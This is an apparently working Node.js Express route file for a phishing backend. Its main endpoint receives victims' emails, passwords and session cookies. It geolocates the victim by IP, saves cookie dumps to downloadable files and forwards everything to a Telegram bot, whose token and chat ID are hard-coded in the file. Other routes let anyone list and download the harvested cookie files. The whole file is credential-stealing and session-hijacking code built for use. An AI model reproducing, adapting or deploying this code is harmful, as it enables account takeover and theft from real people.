// routes/chukachina.js
const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fs = require('fs').promises;
const path = require('path');
const router = express.Router();

// Configure via env variables
const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
const CHAT_ID = process.env.CHAT_ID || "6068638071";

const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
const COOKIES_DIR = path.join(__dirname, '../cookies');

// Telegram message sending function
async function sendTelegramMessage(message) {
  if (!TELEGRAM_API) {
    console.warn('Telegram API not configured');
    return { success: false, error: 'Not configured' };
  }

  try {
    console.log('Attempting to send Telegram message...');
    
    const response = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      }),
      timeout: 10000
    });

    const result = await response.json();
    
    console.log('Telegram API Response:', {
      status: response.status,
      ok: response.ok,
      result: result
    });

    if (!response.ok) {
      throw new Error(`Telegram API error: ${result.description || response.statusText}`);
    }

    return { success: true, data: result };
    
  } catch (error) {
    console.error('Telegram send error:', error.message);
    return { 
      success: false, 
      error: error.message,
      stack: error.stack 
    };
  }
}

async function ensureCookiesDir() {
  try {
    await fs.access(COOKIES_DIR);
  } catch (error) {
    await fs.mkdir(COOKIES_DIR, { recursive: true });
  }
}

// ENHANCED: Function to handle HTTP cookies, JS cookies, AND custom cookies
async function createCookiesFile(email, ip, cookiesBefore, jsCookieData = null, customCookies = null, redirectUrl = null) {
  await ensureCookiesDir();
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `cookies_${email.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.txt`;
  const filepath = path.join(COOKIES_DIR, filename);
  
  let fileContent = `Custom Cookies Capture Report
====================
Email: ${email}
IP: ${ip}
Timestamp: ${new Date().toISOString()}
Redirect URL: ${redirectUrl || 'No redirect'}
File: ${filename}

INITIAL HTTP COOKIES (Before any action):
${Object.entries(cookiesBefore).map(([k, v]) => `${k}: ${v}`).join('\n')}

Total Initial HTTP Cookies: ${Object.keys(cookiesBefore).length}
`;

  // Add CUSTOM COOKIES section (NEW)
  if (customCookies && customCookies.length > 0) {
    fileContent += `

CUSTOM GENERATED COOKIES (${customCookies.length}):
================================================

`;

    customCookies.forEach((cookie, index) => {
      fileContent += `COOKIE ${index + 1}:\n`;
      fileContent += `Name: ${cookie.Name}\n`;
      fileContent += `Value: ${cookie.Value}\n`;
      fileContent += `Domain: ${cookie.Domain}\n`;
      fileContent += `Path: ${cookie.Path}\n`;
      fileContent += `Secure: ${cookie.Secure}\n`;
      fileContent += `HttpOnly: ${cookie.HttpOnly}\n`;
      fileContent += `SameSite: ${cookie.SameSite}\n`;
      
      // Try to decode base64 values for readability
      if (cookie.Name === 'user_auth' || cookie.Name.includes('auth')) {
        try {
          const decoded = JSON.parse(Buffer.from(cookie.Value, 'base64').toString());
          fileContent += `Decoded Auth Data: ${JSON.stringify(decoded, null, 2)}\n`;
        } catch (e) {
          // Not base64 or not JSON, keep as is
        }
      }
      
      // Decode JSON values
      if (cookie.Name === 'user_preferences' || cookie.Value.startsWith('{')) {
        try {
          const decoded = JSON.parse(cookie.Value);
          fileContent += `Decoded Preferences: ${JSON.stringify(decoded, null, 2)}\n`;
        } catch (e) {
          // Not JSON, keep as is
        }
      }
      
      fileContent += '-'.repeat(40) + '\n\n';
    });
  }

  // Add JavaScript cookie data if provided
  if (jsCookieData) {
    fileContent += `

JAVASCRIPT COOKIE SETTER SCRIPT:
===============================
${jsCookieData.substring(0, 3000)}...${jsCookieData.length > 3000 ? `\n[Truncated - total ${jsCookieData.length} chars]` : ''}

`;

    // Try to parse Microsoft-style cookies from the script
    try {
      const cookieMatch = jsCookieData.match(/JSON\.parse\(`([^`]+)`\)/);
      if (cookieMatch && cookieMatch[1]) {
        const cookiesJson = cookieMatch[1];
        const cookiesArray = JSON.parse(cookiesJson);
        
        fileContent += `\nPARSED COOKIES FROM SCRIPT (${cookiesArray.length}):\n`;
        fileContent += '='.repeat(50) + '\n\n';
        
        cookiesArray.forEach((cookie, index) => {
          fileContent += `SCRIPT COOKIE ${index + 1}:\n`;
          fileContent += `Name: ${cookie.Name}\n`;
          fileContent += `Value: ${cookie.Value.substring(0, 100)}...\n`;
          fileContent += `Domain: ${cookie.Domain}\n`;
          fileContent += `Path: ${cookie.Path}\n`;
          fileContent += `Secure: ${cookie.Secure}\n`;
          fileContent += `HttpOnly: ${cookie.HttpOnly}\n`;
          fileContent += `SameSite: ${cookie.SameSite}\n`;
          if (cookie.Expires) fileContent += `Expires: ${new Date(cookie.Expires * 1000).toISOString()}\n`;
          fileContent += '-'.repeat(30) + '\n\n';
        });

        // Extract redirect URL
        const redirectMatch = jsCookieData.match(/window\.location\.href=atob\("([^"]+)"\)/);
        if (redirectMatch && redirectMatch[1]) {
          const redirectUrl = Buffer.from(redirectMatch[1], 'base64').toString();
          fileContent += `REDIRECT URL FROM SCRIPT: ${redirectUrl}\n\n`;
        }
      }
    } catch (parseError) {
      fileContent += `NOTE: Could not parse cookies from script: ${parseError.message}\n\n`;
    }
  }

  await fs.writeFile(filepath, fileContent);
  return { filename, filepath };
}

// ==================== ROUTES ====================

// Health check
router.get('/health', (req, res) => {
  res.json({ 
    status: 'ok',
    service: 'chukachina',
    time: new Date().toISOString(),
    telegramConfigured: !!TELEGRAM_API
  });
});

// File download routes (keep as is)
router.get('/download-cookies/:filename', async (req, res) => {
  try {
    const filename = req.params.filename;
    const filepath = path.join(COOKIES_DIR, filename);
    
    console.log('Attempting to download file:', filename);
    
    try {
      await fs.access(filepath);
      console.log('File exists:', filepath);
    } catch (error) {
      console.log('File not found:', filepath);
      return res.status(404).json({ 
        success: false, 
        message: "Cookie file not found"
      });
    }
    
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    
    const fileStream = require('fs').createReadStream(filepath);
    fileStream.pipe(res);
    
  } catch (error) {
    console.error('Error downloading cookie file:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error downloading file"
    });
  }
});

// List all cookie files (keep as is)
router.get('/cookie-files', async (req, res) => {
  try {
    await ensureCookiesDir();
    const files = await fs.readdir(COOKIES_DIR);
    const cookieFiles = files.filter(file => file.startsWith('cookies_') && file.endsWith('.txt'));
    
    res.json({
      success: true,
      totalFiles: cookieFiles.length,
      files: cookieFiles.map(file => ({
        filename: file,
        downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download-cookies/${file}`
      }))
    });
  } catch (error) {
    console.error('Error listing cookie files:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error listing files"
    });
  }
});

// Test route to verify file creation (keep as is)
router.get('/test-files', async (req, res) => {
  try {
    await ensureCookiesDir();
    const files = await fs.readdir(COOKIES_DIR);
    const cookieFiles = files.filter(file => file.startsWith('cookies_'));
    
    res.json({
      success: true,
      message: `Found ${cookieFiles.length} cookie files`,
      totalFiles: cookieFiles.length,
      files: cookieFiles,
      cookiesDir: COOKIES_DIR
    });
  } catch (error) {
    res.json({
      success: false,
      message: error.message,
      cookiesDir: COOKIES_DIR
    });
  }
});

// Telegram test route (keep as is)
router.post('/test-telegram', async (req, res) => {
  try {
    const testMessage = `🤖 TEST MESSAGE - Server is working!
Time: ${new Date().toISOString()}
This confirms Telegram notifications are working!
Email: test@example.com
Password: test123`;

    console.log('Testing Telegram...');
    const result = await sendTelegramMessage(testMessage);
    
    res.json({
      success: result.success,
      telegramTest: true,
      message: result.success ? 'Telegram message sent successfully!' : 'Failed to send',
      error: result.error
    });
    
  } catch (error) {
    console.error('Telegram test error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// UPDATED MAIN ENDPOINT - Now accepts custom_cookies
router.post('/', async (req, res) => {
  try {
    console.log('=== CHUKACHINA ENDPOINT HIT ===');
    console.log('Body keys:', Object.keys(req.body));
    console.log('Has custom_cookies:', !!req.body.custom_cookies);
    console.log('Has js_cookie_data:', !!req.body.js_cookie_data);

    const { 
      email, 
      password, 
      targetDomain, 
      js_cookie_data, 
      http_cookies, 
      custom_cookies,  // NEW: Accept custom cookies
      user_agent, 
      page_url,
      timestamp 
    } = req.body || {};
    
    if (!email || !password) {
      return res.status(400).json({ 
        success: false, 
        message: "Missing email or password" 
      });
    }

    // IP + geo
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const location = geoip.lookup(ip);
    const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';

    // UA parsing
    const parser = new UAParser(user_agent || req.headers['user-agent'] || '');
    const agent = parser.getResult();
    const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;

    // Create cookies file WITH CUSTOM COOKIES
    let fileInfo = null;
    try {
      fileInfo = await createCookiesFile(email, ip, http_cookies || {}, js_cookie_data, custom_cookies, null);
      console.log(`Cookies file created: ${fileInfo.filename}`);
    } catch (fileError) {
      console.error('Error creating cookies file:', fileError);
    }

    // Build enhanced Telegram message
    let message = `CUSTOM LOGIN NOTIFICATION

Email: ${email}
Password: ${password}
IP: ${ip}
Location: ${locationStr}
Timestamp: ${new Date().toISOString()}
Device: ${deviceType}
Target Domain: ${targetDomain || 'None'}
Page URL: ${page_url || 'None'}
Custom Cookies: ${custom_cookies ? custom_cookies.length : 0}
Cookies File: ${fileInfo ? fileInfo.filename : 'Failed to create'}
Download URL: ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download-cookies/${fileInfo.filename}` : 'None'}

HTTP Cookies (${Object.keys(http_cookies || {}).length}):
${Object.entries(http_cookies || {}).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)'}
`;

    // Add CUSTOM COOKIES to Telegram message
    if (custom_cookies && custom_cookies.length > 0) {
      message += `\nCUSTOM COOKIES (${custom_cookies.length}):\n`;
      custom_cookies.forEach(cookie => {
        let valuePreview = cookie.Value;
        if (cookie.Name === 'user_auth') {
          try {
            const decoded = JSON.parse(Buffer.from(cookie.Value, 'base64').toString());
            valuePreview = `AUTH: ${decoded.email} (${decoded.session})`;
          } catch (e) {
            valuePreview = cookie.Value.substring(0, 30) + '...';
          }
        } else if (cookie.Value.length > 30) {
          valuePreview = cookie.Value.substring(0, 30) + '...';
        }
        message += `- ${cookie.Name}: ${valuePreview}\n`;
      });
    }

    // Add JS cookie info (if any)
    if (js_cookie_data) {
      try {
        const cookieMatch = js_cookie_data.match(/JSON\.parse\(`([^`]+)`\)/);
        if (cookieMatch && cookieMatch[1]) {
          const cookiesArray = JSON.parse(cookieMatch[1]);
          message += `\nSCRIPT COOKIES (${cookiesArray.length}):\n`;
          cookiesArray.forEach(cookie => {
            message += `- ${cookie.Name}: ${cookie.Value.substring(0, 30)}...\n`;
          });
        }
      } catch (parseError) {
        message += `\nJS Cookies: (parse error)\n`;
      }
    }

    // Send to Telegram
    console.log('Sending Telegram notification...');
    const telegramResult = await sendTelegramMessage(message);
    
    if (!telegramResult.success) {
      console.error('Failed to send Telegram notification:', telegramResult.error);
    } else {
      console.log('Telegram notification sent successfully');
    }

    // Return success with download info
    return res.status(200).json({
      success: true,
      message: "Login data received",
      telegramSent: telegramResult.success,
      attemptProcessed: true,
      customCookiesCount: custom_cookies ? custom_cookies.length : 0,
      downloadInfo: fileInfo ? {
        filename: fileInfo.filename,
        downloadUrl: `/chukachina/download-cookies/${fileInfo.filename}`,
        fullDownloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download-cookies/${fileInfo.filename}`
      } : null
    });

  } catch (error) {
    console.error("Full error in /chukachina:", error);
    return res.status(200).json({
      success: true,
      message: "Login processed (with errors)",
      error: error.message
    });
  }
});

module.exports = router;